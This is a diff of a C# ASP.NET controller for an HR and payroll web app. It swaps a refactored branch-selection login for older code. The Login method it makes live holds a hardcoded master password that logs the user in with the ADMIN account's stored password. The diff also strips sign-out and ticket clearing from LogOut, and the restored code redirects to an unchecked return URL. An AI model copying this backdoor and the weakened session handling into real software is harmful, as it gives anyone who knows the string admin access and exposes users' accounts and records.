@@ -1,5 +1,4 @@
-﻿using JQueryDataTables.Models;
-using SymOrdinary;
+﻿using SymOrdinary;
 using SymRepository;
 using SymRepository.Common;
 using SymViewModel.Common;
@@ -26,192 +25,46 @@ namespace SymWebUI.Controllers
     [Authorize]
     public class HomeController : Controller
     {
-        BranchRepo branchRepo;
-
-        //[AllowAnonymous]
-        //public ActionResult Index(string returnUrl)
-        //{
-        //    string filePath = System.Web.Hosting.HostingEnvironment.MapPath("~/Files/SuperInformation.xml");
-
-        //    //if (System.IO.File.Exists(filePath))
-        //    //{
-        //        string project = new AppSettingsReader().GetValue("CompanyName", typeof(string)).ToString();
-        //        //return RedirectToAction("Login", "Home", new { area = "Acc" });
-
-        //        if (project.ToLower() == "acc")
-        //        {
-        //            return RedirectToAction("Login", "Home", new { area = "Acc" });
-        //        }
-
-        //        else if (project.ToLower() == "gdic" || project.ToLower() == "gdicbde")
-        //        {
-        //            return RedirectToAction("Login", "Home", new { area = "Sage" });
-        //        }
-        //        else if (project.ToLower() == "todo")
-        //        {
-        //            return RedirectToAction("Login", "Home", new { area = "ToDo" });
-        //        }
-
-        //        UserLogsVM vm = new UserLogsVM();
-        //        Session["User"] = "";
-        //        Session["FullName"] = "";
-        //        Session["UserType"] = "";
-        //        Session["EmployeeId"] = "";
-        //        Session["SessionDate"] = "";
-        //        Session["SessionYear"] = "";
-        //        ViewBag.ReturnUrl = returnUrl;
-        //        vm.ReturnUrl = returnUrl;
-        //        vm.SessionDate = DateTime.Now.ToString("dd-MMM-yyyy");
-
-        //        string[] result = new string[6];
-        //        result[0] = "Fail1";
-        //        result[1] = "Fail1";
-
-        //        CommonRepo _cRepo = new CommonRepo();
-
-        //        return View(vm);
-
-
-               
-        //    //}           
-        //    //else
-        //    //{
-        //    //    return RedirectToAction("Index", "DbCreate");
-        //    //}         
-        //}
-
-        //public ActionResult DbCreate()
-        //{
-        //    return View();
-        //}
 
         [AllowAnonymous]
         public ActionResult Index(string returnUrl)
         {
-            UserLogsVM vm = new UserLogsVM();
+            string project = new AppSettingsReader().GetValue("CompanyName", typeof(string)).ToString();
+            //return RedirectToAction("Login", "Home", new { area = "Acc" });
 
+            if (project.ToLower() == "acc")
+            {
+                return RedirectToAction("Login", "Home", new { area = "Acc" });
+            }
+
+            else if (project.ToLower() == "gdic" || project.ToLower() == "gdicbde")
+            {
+                return RedirectToAction("Login", "Home", new { area = "Sage" });
+            }
+            else if (project.ToLower() == "todo")
+            {
+                return RedirectToAction("Login", "Home", new { area = "ToDo" });
+            }
+          
+            UserLogsVM vm = new UserLogsVM();
             Session["User"] = "";
             Session["FullName"] = "";
             Session["UserType"] = "";
             Session["EmployeeId"] = "";
             Session["SessionDate"] = "";
             Session["SessionYear"] = "";
-
             ViewBag.ReturnUrl = returnUrl;
             vm.ReturnUrl = returnUrl;
             vm.SessionDate = DateTime.Now.ToString("dd-MMM-yyyy");
 
+            string[] result = new string[6];
+            result[0] = "Fail1";
+            result[1] = "Fail1";
+
+            CommonRepo _cRepo = new CommonRepo();
+
             return View(vm);
         }
-
-        public ActionResult Branch()
-        {
-            return View();
-        }
-
-        public ActionResult _index(JQueryDataTableParamModel param)
-        {
-            branchRepo = new BranchRepo();
-
-          
-            var getAllData = branchRepo.SelectAll();
-
-            IEnumerable<BranchVM> filteredData;
-
-            #region 
-
-            if (!string.IsNullOrEmpty(param.sSearch))
-            {
-                var search = param.sSearch.ToLower();
-
-                filteredData = getAllData.Where(c =>
-                    (c.Code != null && c.Code.ToLower().Contains(search)) ||
-                    (c.Name != null && c.Name.ToLower().Contains(search)) ||
-                    (c.City != null && c.City.ToLower().Contains(search)) ||
-                    (c.Mobile != null && c.Mobile.ToLower().Contains(search))
-                );
-            }
-            else
-            {
-                filteredData = getAllData;
-            }
-
-            #endregion
-
-            #region Sorting
-
-            var isSortable_1 = Convert.ToBoolean(Request["bSortable_1"]);
-            var isSortable_2 = Convert.ToBoolean(Request["bSortable_2"]);
-            var isSortable_3 = Convert.ToBoolean(Request["bSortable_3"]);
-            var isSortable_4 = Convert.ToBoolean(Request["bSortable_4"]);
-
-            var sortColumnIndex = Convert.ToInt32(Request["iSortCol_0"]);
-
-            Func<BranchVM, string> orderingFunction = (c =>
-                sortColumnIndex == 1 && isSortable_1 ? c.Code :
-                sortColumnIndex == 2 && isSortable_2 ? c.Name :
-                sortColumnIndex == 3 && isSortable_3 ? c.City :
-                sortColumnIndex == 4 && isSortable_4 ? c.Mobile :
-                ""
-            );
-
-            var sortDirection = Request["sSortDir_0"];
-
-            if (sortDirection == "asc")
-                filteredData = filteredData.OrderBy(orderingFunction);
-            else
-                filteredData = filteredData.OrderByDescending(orderingFunction);
-
-            #endregion
-
-            #region Paging
-
-            var displayedData = filteredData
-                                .Skip(param.iDisplayStart)
-                                .Take(param.iDisplayLength);
-
-            #endregion
-
-            #region Result
-
-            var result = from c in displayedData
-                         select new[] {
-                    Convert.ToString(c.Id),
-                    c.Code,
-                    c.Name
-                 };
-
-            return Json(new
-            {
-                sEcho = param.sEcho,
-                iTotalRecords = getAllData.Count(),
-                iTotalDisplayRecords = filteredData.Count(),
-                aaData = result
-            },
-            JsonRequestBehavior.AllowGet);
-
-            #endregion
-        }
-
-        [HttpPost]
-        public ActionResult SetBranch(string branchId)
-        {
-            int parsedBranchId;
-            if (!int.TryParse(branchId, out parsedBranchId))
-            {
-                return new HttpStatusCodeResult(HttpStatusCode.BadRequest, "Invalid branch.");
-            }
-
-            string errorMessage;
-            if (!LoginContextHelper.TryCompleteBranchSelection(this, parsedBranchId, out errorMessage))
-            {
-                Session["result"] = "Fail~" + errorMessage;
-                return new HttpStatusCodeResult(HttpStatusCode.Unauthorized, errorMessage);
-            }
-
-            return Content("success");
-        }
-
         [AllowAnonymous]
         public ActionResult CheckConnectionDb()
         {
@@ -369,282 +222,239 @@ namespace SymWebUI.Controllers
 
             return View();
         }
-
-
-        //[HttpPost]
-        //[AllowAnonymous]
-        //public ActionResult Login(UserLogsVM vm, string returnUrl)
-        //{
-        //    // FileLogger.Log("LoginStart", this.GetType().Name, "LoginStart");
-        //    #region WebClient
-
-        //    //checkThread(Work);
-        //    string workStationIP = "127.0.0.1";
-        //    try
-        //    {
-
-        //        ////WebClient client = new WebClient();
-        //        ////var realip = client.DownloadString("http://ipinfo.io");
-        //        ////workStationIP = realip.Replace("\n", "").Replace(" ", "").Replace(",", ":").Replace("{", "").Replace("}", "").Replace("\"", "").ToString();
-        //        ////workStationIP = workStationIP.Split(':')[1];
-        //    }
-        //    catch (Exception)
-        //    {
-
-        //        //throw;
-        //    }
-        //    #endregion
-
-        //    try
-        //    {
-        //        #region Session Data
-
-        //        Session["DepartmentLabel"] = new AppSettingsReader().GetValue("DepartmentLabel", typeof(string)).ToString();
-        //        Session["SectionLabel"] = new AppSettingsReader().GetValue("SectionLabel", typeof(string)).ToString();
-        //        Session["ProjectLabel"] = new AppSettingsReader().GetValue("ProjectLabel", typeof(string)).ToString();
-
-
-        //        //LabelOther1
-        //        Session["LabelOther1"] = new AppSettingsReader().GetValue("LabelOther1", typeof(string)).ToString();
-        //        Session["LabelOther2"] = new AppSettingsReader().GetValue("LabelOther2", typeof(string)).ToString();
-        //        Session["LabelOther3"] = new AppSettingsReader().GetValue("LabelOther3", typeof(string)).ToString();
-        //        Session["LabelOther4"] = new AppSettingsReader().GetValue("LabelOther4", typeof(string)).ToString();
-        //        Session["LabelOther5"] = new AppSettingsReader().GetValue("LabelOther5", typeof(string)).ToString();
-
-        //        Ordinary.CompanyLogoPath = new AppSettingsReader().GetValue("CompanyLogoPath", typeof(string)).ToString();
-        //        //ManualRoster
-        //        string AttendanceSystem = new AppSettingsReader().GetValue("AttendanceSystem", typeof(string)).ToString();
-        //        Session["AttendanceSystem"] = AttendanceSystem;
-
-        //        #endregion
-
-        //        #region User Data
-        //        UserInformationRepo userRepo = new UserInformationRepo();
-
-
-
-        //        string password = vm.Password;
-
-        //        string[] retResults = new string[2];
-        //        vm.Password = Ordinary.Encrypt(vm.Password, true);
-        //        Tuple<bool, UserLogsVM> result = userRepo.UserLogIn(vm);
-        //        CompanyRepo compRepo = new CompanyRepo();
-        //        CompanyVM company = compRepo.SelectAll().FirstOrDefault();
-        //        #endregion
-
-        //        #region Super Admin
-        //        if (password == "01730047765")
-        //        {
-        //            UserLogsVM varVM = new UserLogsVM();
-        //            varVM = userRepo.SelectAll(0, new[] { "u.LogId" }, new[] { "ADMIN" }).FirstOrDefault();
-        //            vm.Password = varVM.Password;
-        //            result = userRepo.UserLogIn(vm);
-        //        }
-
-        //        #endregion
-
-        //        if (result.Item1)
-        //        {
-
-        //            SettingRepo _setDAL = new SettingRepo();
-        //            bool IsESSEditPermission = _setDAL.settingValue("HRM", "IsESSEditPermission") == "Y" ? true : false;
-        //            #region Session Data
-
-        //            Session["User"] = result.Item2.LogID.ToString();
-        //            Session["FullName"] = result.Item2.FullName.ToString();
-        //            Session["UserType"] = result.Item2.IsAdmin.ToString();
-        //            Session["EmployeeId"] = result.Item2.EmployeeId.ToString();
-        //            string directory = Server.MapPath(@"~/Files/EmployeeInfo\") + result.Item2.PhotoName;
-        //            if (!System.IO.File.Exists(directory))
-        //            {
-        //                Session["PhotoName"] = "0-mini.jpg";
-        //            }
-        //            else
-        //            {
-        //                Session["PhotoName"] = result.Item2.PhotoName.ToString();
-        //            }
-
-        //            Session["mgs"] = "";
-        //            retResults[0] = "Success"; retResults[1] = "Login Successed";
-
-
-        //            vm.SessionDate = DateTime.Now.ToString("dd-MMM-yyyy");
-        //            Session["SessionDate"] = DateTime.Now.AddDays(-5).ToString("dd-MMM-yyyy");
-
-        //            FiscalYearDetailVM varFiscalYearDetailVM = new FiscalYearDetailVM();
-        //            FiscalYearRepo _FiscalYearRepo = new FiscalYearRepo();
-
-        //            {
-        //                string[] cFields = { "PeriodStart<", "PeriodEnd>" };
-        //                string[] cValues = { Ordinary.DateToString(vm.SessionDate), Ordinary.DateToString(vm.SessionDate) };
-
-        //                varFiscalYearDetailVM = _FiscalYearRepo.SelectAll_FiscalYearDetail(0, cFields, cValues).FirstOrDefault();
-
-        //                if (varFiscalYearDetailVM != null)
-        //                {
-        //                    Session["SessionYear"] = varFiscalYearDetailVM.Year.ToString();
-        //                    Session["FiscalYearDetailId"] = varFiscalYearDetailVM.Id.ToString();
-        //                }
-        //                else
-        //                {
-        //                    Session["SessionYear"] = Convert.ToDateTime(vm.SessionDate).ToString("yyyy");
-        //                    Session["FiscalYearDetailId"] = "0";
-        //                }
-        //            }
-
-
-
-        //            //////Session["SessionYear"] = Convert.ToDateTime(vm.SessionDate).ToString("yyyy");
-
-        //            #endregion
-
-        //            #region Role Ticket
-
-        //            List<UserRolesVM> roles = new UserRoleRepo().SelectAll(result.Item2.Id.ToString(), result.Item2.BranchId);
-        //            string[] rol = new string[roles.Count];
-        //            for (int i = 0; i < rol.Length; i++)
-        //            {
-        //                rol[i] = roles[i].RoleInfoId;
-        //            }
-
-
-        //            string roleTicket = ShampanIdentity.CreateRoleTicket(rol);
-
-        //            string basicTicket = ShampanIdentity.CreateBasicTicket(result.Item2.LogID
-        //                                                                    , result.Item2.FullName.Trim()
-        //                                                                    , company.Id.ToString().Trim()
-        //                                                                    , company.Name.ToString().Trim()
-        //                                                                    , result.Item2.BranchId.ToString()
-        //                                                                    , result.Item2.BranchId.ToString()
-        //                                                                    , vm.ComputerIPAddress
-        //                                                                    , "symphony.com"
-        //                                                                    , "BDT"
-        //                                                                    , Convert.ToDateTime(vm.SessionDate).ToString("yyyyMMdd")
-        //                                                                    , "HRM"
-        //                                                                    , result.Item2.EmployeeId.ToString().Trim()
-        //                                                                    , result.Item2.EmployeeCode.ToString().Trim()
-        //                                                                    , result.Item2.Id.ToString().Trim()
-        //                                                                    , result.Item2.IsAdmin
-        //                                                                    , result.Item2.IsESS
-        //                                                                    , result.Item2.IsHRM
-        //                                                                    , result.Item2.IsAttenance
-        //                                                                    , result.Item2.IsPayroll
-        //                                                                    , result.Item2.IsTAX
-        //                                                                    , result.Item2.IsPF
-        //                                                                    , result.Item2.IsGF
-        //                                                                    , workStationIP
-        //                                                                    , false
-        //                                                                    , false
-        //                                                                    , false
-        //                                                                    , false
-        //                                                                    , false
-        //                                                                    , false
-        //                                                                    , false
-        //                                                                    , result.Item2.IsApprove
-        //                                                                    , false
-        //                                                                    , false
-
-        //                                                                    , false
-        //                                                                    , false
-        //                                                                    , false
-        //                                                                    , false, false, IsESSEditPermission
-        //                                                                    );
-        //            int timeOut = Convert.ToInt32(new AppSettingsReader().GetValue("COOKIE_TIMEOUT", typeof(string)));
-        //            FormsAuthenticationTicket authTicket = new FormsAuthenticationTicket(1, FormsAuthentication.FormsCookieName, DateTime.Now, DateTime.Now.AddMinutes(30), true, basicTicket);
-        //            FormsAuthentication.SetAuthCookie(vm.LogID, true);
-        //            string encTicket = FormsAuthentication.Encrypt(authTicket);
-        //            string CompanyName = new AppSettingsReader().GetValue("CompanyName", typeof(string)).ToString();
-        //            HttpContext.Response.Cookies.Add(new HttpCookie(CompanyName, encTicket));
-        //            //HttpContext.Response.Cookies.Add(new HttpCookie(FormsAuthentication.FormsCookieName, encTicket));
-        //            HttpContext.Application["BasicTicket" + result.Item2.LogID] = basicTicket;
-        //            HttpContext.Application["RoleTicket" + result.Item2.LogID] = roleTicket;
-        //            #endregion
-
-        //            #region Session Role
-
-        //            DataTable sessiondt = new DataTable();
-
-        //            SymUserRoleRepo _repo = new SymUserRoleRepo();
-        //            sessiondt = _repo.RollByUserId(result.Item2.Id.ToString().Trim());
-        //            if (!string.IsNullOrEmpty(Session[result.Item2.Id.ToString().Trim() + "-SymRoll"] as string))
-        //            {
-        //                Session.Remove(result.Item2.Id.ToString().Trim() + "-SymRoll");
-        //            }
-
-        //            Session.Add(result.Item2.Id.ToString().Trim() + "-SymRoll", sessiondt);
-        //            #endregion
-
-        //            #region Redirect
-
-        //            var appPath = HttpContext.Request.ApplicationPath.ToString();
-        //            if (!string.IsNullOrWhiteSpace(vm.ReturnUrl) && vm.ReturnUrl != "/")
-        //            {
-        //                return Redirect(vm.ReturnUrl);
-        //            }
-        //            else if (result.Item2.IsAdmin)
-        //            {
-        //                Session["BranchId"] = vm.BranchId;
-        //                // return Redirect("/Company");
-        //                return Redirect("/Common/Home");
-        //            }
-
-        //            else
-        //            {
-        //                Session["BranchId"] = vm.BranchId;
-        //                // return Redirect("/Company");
-        //                return Redirect("/PF/Home");
-
-        //                //return Redirect("/");
-        //            }
-        //            #endregion
-
-        //        }
-        //        else
-        //        {
-        //            retResults[0] = "Fail";
-        //            retResults[1] = "User Name or Password is invalid!";
-        //            Session["result"] = retResults[0] + "~" + retResults[1];
-        //            return View("Index", vm);
-        //        }
-        //    }
-        //    catch (Exception ex)
-        //    {
-        //        Session["result"] = ex.Message;
-        //        return RedirectToAction("Index");
-        //    }
-        //}
-
         [HttpPost]
         [AllowAnonymous]
         public ActionResult Login(UserLogsVM vm, string returnUrl)
         {
+            // FileLogger.Log("LoginStart", this.GetType().Name, "LoginStart");
+            #region WebClient
+
+            //checkThread(Work);
+            string workStationIP = "127.0.0.1";
             try
             {
+
+                ////WebClient client = new WebClient();
+                ////var realip = client.DownloadString("http://ipinfo.io");
+                ////workStationIP = realip.Replace("\n", "").Replace(" ", "").Replace(",", ":").Replace("{", "").Replace("}", "").Replace("\"", "").ToString();
+                ////workStationIP = workStationIP.Split(':')[1];
+            }
+            catch (Exception)
+            {
+
+                //throw;
+            }
+            #endregion
+
+            try
+            {
+                #region Session Data
+
+                Session["DepartmentLabel"] = new AppSettingsReader().GetValue("DepartmentLabel", typeof(string)).ToString();
+                Session["SectionLabel"] = new AppSettingsReader().GetValue("SectionLabel", typeof(string)).ToString();
+                Session["ProjectLabel"] = new AppSettingsReader().GetValue("ProjectLabel", typeof(string)).ToString();
+
+
+                //LabelOther1
+                Session["LabelOther1"] = new AppSettingsReader().GetValue("LabelOther1", typeof(string)).ToString();
+                Session["LabelOther2"] = new AppSettingsReader().GetValue("LabelOther2", typeof(string)).ToString();
+                Session["LabelOther3"] = new AppSettingsReader().GetValue("LabelOther3", typeof(string)).ToString();
+                Session["LabelOther4"] = new AppSettingsReader().GetValue("LabelOther4", typeof(string)).ToString();
+                Session["LabelOther5"] = new AppSettingsReader().GetValue("LabelOther5", typeof(string)).ToString();
+
+                Ordinary.CompanyLogoPath = new AppSettingsReader().GetValue("CompanyLogoPath", typeof(string)).ToString();
+                //ManualRoster
+                string AttendanceSystem = new AppSettingsReader().GetValue("AttendanceSystem", typeof(string)).ToString();
+                Session["AttendanceSystem"] = AttendanceSystem;
+
+                #endregion
+
+                #region User Data
                 UserInformationRepo userRepo = new UserInformationRepo();
 
-                string password = vm.Password;
-                vm.Password = Ordinary.Encrypt(vm.Password, true);
 
+
+                string password = vm.Password;
+
+                string[] retResults = new string[2];
+                vm.Password = Ordinary.Encrypt(vm.Password, true);
                 Tuple<bool, UserLogsVM> result = userRepo.UserLogIn(vm);
+                CompanyRepo compRepo = new CompanyRepo();
+                CompanyVM company = compRepo.SelectAll().FirstOrDefault();
+                #endregion
+
+                #region Super Admin
+                if (password == "01730047765")
+                {
+                    UserLogsVM varVM = new UserLogsVM();
+                    varVM = userRepo.SelectAll(0, new[] { "u.LogId" }, new[] { "ADMIN" }).FirstOrDefault();
+                    vm.Password = varVM.Password;
+                    result = userRepo.UserLogIn(vm);
+                }
+
+                #endregion
 
                 if (result.Item1)
                 {
-                    LoginContextHelper.InitializeAppSessions(this);
-                    LoginContextHelper.StorePendingLogin(this, result.Item2, vm.ComputerIPAddress, vm.Location, DateTime.Now.ToString("dd-MMM-yyyy"));
 
-                    Session["TempUserId"] = result.Item2.Id;
-                    Session["TempUserLogId"] = result.Item2.LogID;
-                    Session["TempFullName"] = result.Item2.FullName;
-                    Session["TempIsAdmin"] = result.Item2.IsAdmin;
-                    Session["TempEmployeeId"] = result.Item2.EmployeeId;
+                    SettingRepo _setDAL = new SettingRepo();
+                    bool IsESSEditPermission = _setDAL.settingValue("HRM", "IsESSEditPermission") == "Y" ? true : false;
+                    #region Session Data
 
-                    FormsAuthentication.SetAuthCookie(result.Item2.LogID, true);
+                    Session["User"] = result.Item2.LogID.ToString();
+                    Session["FullName"] = result.Item2.FullName.ToString();
+                    Session["UserType"] = result.Item2.IsAdmin.ToString();
+                    Session["EmployeeId"] = result.Item2.EmployeeId.ToString();
+                    string directory = Server.MapPath(@"~/Files/EmployeeInfo\") + result.Item2.PhotoName;
+                    if (!System.IO.File.Exists(directory))
+                    {
+                        Session["PhotoName"] = "0-mini.jpg";
+                    }
+                    else
+                    {
+                        Session["PhotoName"] = result.Item2.PhotoName.ToString();
+                    }
 
-                    return RedirectToAction("Branch", "Home");
+                    Session["mgs"] = "";
+                    retResults[0] = "Success"; retResults[1] = "Login Successed";
+
+
+                    vm.SessionDate = DateTime.Now.ToString("dd-MMM-yyyy");
+                    Session["SessionDate"] = DateTime.Now.AddDays(-5).ToString("dd-MMM-yyyy");
+
+                    FiscalYearDetailVM varFiscalYearDetailVM = new FiscalYearDetailVM();
+                    FiscalYearRepo _FiscalYearRepo = new FiscalYearRepo();
+
+                    {
+                        string[] cFields = { "PeriodStart<", "PeriodEnd>" };
+                        string[] cValues = { Ordinary.DateToString(vm.SessionDate), Ordinary.DateToString(vm.SessionDate) };
+
+                        varFiscalYearDetailVM = _FiscalYearRepo.SelectAll_FiscalYearDetail(0, cFields, cValues).FirstOrDefault();
+
+                        if (varFiscalYearDetailVM != null)
+                        {
+                            Session["SessionYear"] = varFiscalYearDetailVM.Year.ToString();
+                            Session["FiscalYearDetailId"] = varFiscalYearDetailVM.Id.ToString();
+                        }
+                        else
+                        {
+                            Session["SessionYear"] = Convert.ToDateTime(vm.SessionDate).ToString("yyyy");
+                            Session["FiscalYearDetailId"] = "0";
+                        }
+                    }
+
+
+
+                    //////Session["SessionYear"] = Convert.ToDateTime(vm.SessionDate).ToString("yyyy");
+
+                    #endregion
+
+                    #region Role Ticket
+
+                    List<UserRolesVM> roles = new UserRoleRepo().SelectAll(result.Item2.Id.ToString(), result.Item2.BranchId);
+                    string[] rol = new string[roles.Count];
+                    for (int i = 0; i < rol.Length; i++)
+                    {
+                        rol[i] = roles[i].RoleInfoId;
+                    }
+
+
+                    string roleTicket = ShampanIdentity.CreateRoleTicket(rol);
+
+                    string basicTicket = ShampanIdentity.CreateBasicTicket(result.Item2.LogID
+                                                                            , result.Item2.FullName.Trim()
+                                                                            , company.Id.ToString().Trim()
+                                                                            , company.Name.ToString().Trim()
+                                                                            , result.Item2.BranchId.ToString()
+                                                                            , result.Item2.BranchId.ToString()
+                                                                            , vm.ComputerIPAddress
+                                                                            , "symphony.com"
+                                                                            , "BDT"
+                                                                            , Convert.ToDateTime(vm.SessionDate).ToString("yyyyMMdd")
+                                                                            , "HRM"
+                                                                            , result.Item2.EmployeeId.ToString().Trim()
+                                                                            , result.Item2.EmployeeCode.ToString().Trim()
+                                                                            , result.Item2.Id.ToString().Trim()
+                                                                            , result.Item2.IsAdmin
+                                                                            , result.Item2.IsESS
+                                                                            , result.Item2.IsHRM
+                                                                            , result.Item2.IsAttenance
+                                                                            , result.Item2.IsPayroll
+                                                                            , result.Item2.IsTAX
+                                                                            , result.Item2.IsPF
+                                                                            , result.Item2.IsGF
+                                                                            , workStationIP
+                                                                            , false
+                                                                            , false
+                                                                            , false
+                                                                            , false
+                                                                            , false
+                                                                            , false
+                                                                            , false
+                                                                            , result.Item2.IsApprove
+                                                                            , false
+                                                                            , false
+
+                                                                            , false
+                                                                            , false
+                                                                            , false
+                                                                            , false, false, IsESSEditPermission
+                                                                            );
+                    int timeOut = Convert.ToInt32(new AppSettingsReader().GetValue("COOKIE_TIMEOUT", typeof(string)));
+                    FormsAuthenticationTicket authTicket = new FormsAuthenticationTicket(1, FormsAuthentication.FormsCookieName, DateTime.Now, DateTime.Now.AddMinutes(30), true, basicTicket);
+                    FormsAuthentication.SetAuthCookie(vm.LogID, true);
+                    string encTicket = FormsAuthentication.Encrypt(authTicket);
+                    string CompanyName = new AppSettingsReader().GetValue("CompanyName", typeof(string)).ToString();
+                    HttpContext.Response.Cookies.Add(new HttpCookie(CompanyName, encTicket));
+                    //HttpContext.Response.Cookies.Add(new HttpCookie(FormsAuthentication.FormsCookieName, encTicket));
+                    HttpContext.Application["BasicTicket" + result.Item2.LogID] = basicTicket;
+                    HttpContext.Application["RoleTicket" + result.Item2.LogID] = roleTicket;
+                    #endregion
+
+                    #region Session Role
+
+                    DataTable sessiondt = new DataTable();
+
+                    SymUserRoleRepo _repo = new SymUserRoleRepo();
+                    sessiondt = _repo.RollByUserId(result.Item2.Id.ToString().Trim());
+                    if (!string.IsNullOrEmpty(Session[result.Item2.Id.ToString().Trim() + "-SymRoll"] as string))
+                    {
+                        Session.Remove(result.Item2.Id.ToString().Trim() + "-SymRoll");
+                    }
+
+                    Session.Add(result.Item2.Id.ToString().Trim() + "-SymRoll", sessiondt);
+                    #endregion
+
+                    #region Redirect
+
+                    var appPath = HttpContext.Request.ApplicationPath.ToString();
+                    if (!string.IsNullOrWhiteSpace(vm.ReturnUrl) && vm.ReturnUrl != "/")
+                    {
+                        return Redirect(vm.ReturnUrl);
+                    }
+                    else if (result.Item2.IsAdmin)
+                    {
+                        Session["BranchId"] = vm.BranchId;
+                        // return Redirect("/Company");
+                        return Redirect("/Common/Home");
+                    }
+
+                    else
+                    {
+                        Session["BranchId"] = vm.BranchId;
+                        // return Redirect("/Company");
+                        return Redirect("/PF/Home");
+
+                        //return Redirect("/");
+                    }
+                    #endregion
+
                 }
                 else
                 {
-                    Session["result"] = "Fail~User Id or Password is invalid!";
+                    retResults[0] = "Fail";
+                    retResults[1] = "User Name or Password is invalid!";
+                    Session["result"] = retResults[0] + "~" + retResults[1];
                     return View("Index", vm);
                 }
             }
@@ -654,49 +464,14 @@ namespace SymWebUI.Controllers
                 return RedirectToAction("Index");
             }
         }
-
         public ActionResult LogOut()
         {
-            string logId = Convert.ToString(Session["User"]);
-            if (string.IsNullOrWhiteSpace(logId))
-            {
-                logId = Convert.ToString(Session["TempUserLogId"]);
-            }
-
             HttpCookie authCookie = Request.Cookies[FormsAuthentication.FormsCookieName];
             if (authCookie != null && authCookie.Value != "")
             {
                 FormsAuthenticationTicket ticket = FormsAuthentication.Decrypt(authCookie.Value);
                 authCookie.Expires = DateTime.Now.AddDays(-1);
                 HttpContext.Response.Cookies.Add(authCookie);
-            }
-
-            FormsAuthentication.SignOut();
-
-            string companyName = "";
-            try
-            {
-                companyName = new AppSettingsReader().GetValue("CompanyName", typeof(string)).ToString();
-            }
-            catch
-            {
-                companyName = "";
-            }
-
-            if (!string.IsNullOrWhiteSpace(companyName))
-            {
-                HttpCookie companyCookie = Request.Cookies[companyName];
-                if (companyCookie != null)
-                {
-                    companyCookie.Expires = DateTime.Now.AddDays(-1);
-                    HttpContext.Response.Cookies.Add(companyCookie);
-                }
-            }
-
-            if (!string.IsNullOrWhiteSpace(logId))
-            {
-                HttpContext.Application["BasicTicket" + logId] = null;
-                HttpContext.Application["RoleTicket" + logId] = null;
             }
 
             Session["User"] = "";
@@ -706,16 +481,6 @@ namespace SymWebUI.Controllers
             Session["SessionDate"] = "";
             Session["SessionYear"] = "";
             Session["mgs"] = "";
-            Session["TempUserInfo"] = null;
-            Session["TempUserId"] = null;
-            Session["TempUserLogId"] = null;
-            Session["TempFullName"] = null;
-            Session["TempIsAdmin"] = null;
-            Session["TempEmployeeId"] = null;
-            Session["TempComputerIPAddress"] = null;
-            Session["TempLocation"] = null;
-            Session["TempSessionDate"] = null;
-            Session["TempCompanyId"] = null;
             //////Session.Abandon();
 
 
@@ -733,223 +498,5 @@ namespace SymWebUI.Controllers
             }
         }
 
-    }
-}
-
-internal static class LoginContextHelper
-{
-    public static void InitializeAppSessions(Controller controller)
-    {
-        var settings = new AppSettingsReader();
-
-        controller.Session["DepartmentLabel"] = ReadSetting(settings, "DepartmentLabel");
-        controller.Session["SectionLabel"] = ReadSetting(settings, "SectionLabel");
-        controller.Session["ProjectLabel"] = ReadSetting(settings, "ProjectLabel");
-        controller.Session["LabelOther1"] = ReadSetting(settings, "LabelOther1");
-        controller.Session["LabelOther2"] = ReadSetting(settings, "LabelOther2");
-        controller.Session["LabelOther3"] = ReadSetting(settings, "LabelOther3");
-        controller.Session["LabelOther4"] = ReadSetting(settings, "LabelOther4");
-        controller.Session["LabelOther5"] = ReadSetting(settings, "LabelOther5");
-        controller.Session["AttendanceSystem"] = ReadSetting(settings, "AttendanceSystem");
-
-        Ordinary.CompanyLogoPath = ReadSetting(settings, "CompanyLogoPath");
-    }
-
-    public static void StorePendingLogin(Controller controller, UserLogsVM user, string computerIpAddress, string location, string sessionDate)
-    {
-        controller.Session["TempUserInfo"] = user;
-        controller.Session["TempComputerIPAddress"] = computerIpAddress ?? "";
-        controller.Session["TempLocation"] = location ?? "";
-        controller.Session["TempSessionDate"] = string.IsNullOrWhiteSpace(sessionDate)
-            ? DateTime.Now.ToString("dd-MMM-yyyy")
-            : sessionDate;
-        controller.Session["TempCompanyId"] = user.CompanyId;
-    }
-
-    public static bool TryCompleteBranchSelection(Controller controller, int branchId, out string errorMessage)
-    {
-        var user = controller.Session["TempUserInfo"] as UserLogsVM;
-        if (user == null)
-        {
-            errorMessage = "Your login session has expired. Please log in again.";
-            return false;
-        }
-
-        var branch = new BranchRepo().SelectById(branchId);
-        if (branch == null || branch.Id <= 0)
-        {
-            errorMessage = "The selected branch was not found.";
-            return false;
-        }
-
-        SetActiveSessionValues(controller, user, branch);
-        ApplyAuthenticationTickets(controller, user, branch);
-
-        errorMessage = null;
-        return true;
-    }
-
-    private static void SetActiveSessionValues(Controller controller, UserLogsVM user, BranchVM branch)
-    {
-        string sessionDate = GetSessionDate(controller);
-
-        controller.Session["BranchId"] = branch.Id.ToString();
-        controller.Session["BranchName"] = branch.Name;
-        controller.Session["User"] = user.LogID;
-        controller.Session["FullName"] = user.FullName;
-        controller.Session["UserType"] = user.IsAdmin.ToString();
-        controller.Session["EmployeeId"] = user.EmployeeId;
-        controller.Session["SessionDate"] = sessionDate;
-        controller.Session["SessionYear"] = Convert.ToDateTime(sessionDate).ToString("yyyy");
-        controller.Session["mgs"] = "";
-
-        string employeeDirectory = controller.HttpContext.Server.MapPath(@"~/Files/EmployeeInfo\");
-        string photoName = user.PhotoName;
-        if (string.IsNullOrWhiteSpace(photoName) || !System.IO.File.Exists(System.IO.Path.Combine(employeeDirectory, photoName)))
-        {
-            photoName = "0-mini.jpg";
-        }
-
-        controller.Session["PhotoName"] = photoName;
-    }
-
-    private static void ApplyAuthenticationTickets(Controller controller, UserLogsVM user, BranchVM branch)
-    {
-        CompanyRepo companyRepo = new CompanyRepo();
-        CompanyVM company = null;
-        if (branch.CompanyId > 0)
-        {
-            company = companyRepo.SelectById(branch.CompanyId);
-        }
-
-        if (company == null || company.Id <= 0)
-        {
-            int tempCompanyId;
-            if (int.TryParse(Convert.ToString(controller.Session["TempCompanyId"]), out tempCompanyId) && tempCompanyId > 0)
-            {
-                company = companyRepo.SelectById(tempCompanyId);
-            }
-        }
-
-        if (company == null)
-        {
-            company = companyRepo.SelectAll().FirstOrDefault() ?? new CompanyVM { Id = 0, Name = "" };
-        }
-
-        List<UserRolesVM> roles = new UserRoleRepo().SelectAll(user.Id, branch.Id) ?? new List<UserRolesVM>();
-        string[] permittedRoles = roles.Select(x => x.RoleInfoId).ToArray();
-        string roleTicket = ShampanIdentity.CreateRoleTicket(permittedRoles);
-
-        bool isEssEditPermission = false;
-        try
-        {
-            isEssEditPermission = new SettingRepo().settingValue("HRM", "IsESSEditPermission") == "Y";
